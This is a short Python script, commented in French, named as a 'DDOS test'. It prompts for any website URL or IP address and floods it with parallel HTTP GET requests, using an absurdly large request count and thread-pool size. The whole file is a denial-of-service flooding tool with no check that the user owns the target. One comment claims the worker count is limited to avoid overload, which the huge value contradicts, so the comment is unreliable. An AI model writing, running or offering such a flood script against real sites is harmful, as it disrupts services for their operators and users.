import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def DDOS_test():
    
    while True:
        ip = input('Entrer "q" pour quitter\n\nEntrer l\'url ou l\'adresse IP du site : ')
        
        
        if ip == "q":
            break
        
        else:
        
            url = ip

            # Fonction pour envoyer une requête au serveur
            def access_server():
                try:
                    response = requests.get(url)
                    return f"Réponse du serveur: {response.status_code}"
                except requests.exceptions.RequestException as e:
                    return f"Erreur lors de la requête: {e}"

            # Nombre de requêtes
            nombre_acces = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999

            # Utilisation de ThreadPoolExecutor pour exécuter des requêtes en parallèle
            # Limiter le nombre de workers pour éviter de surcharger le système
            max_workers = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(access_server) for _ in range(nombre_acces)]

                for future in as_completed(futures):
                    print(future.result())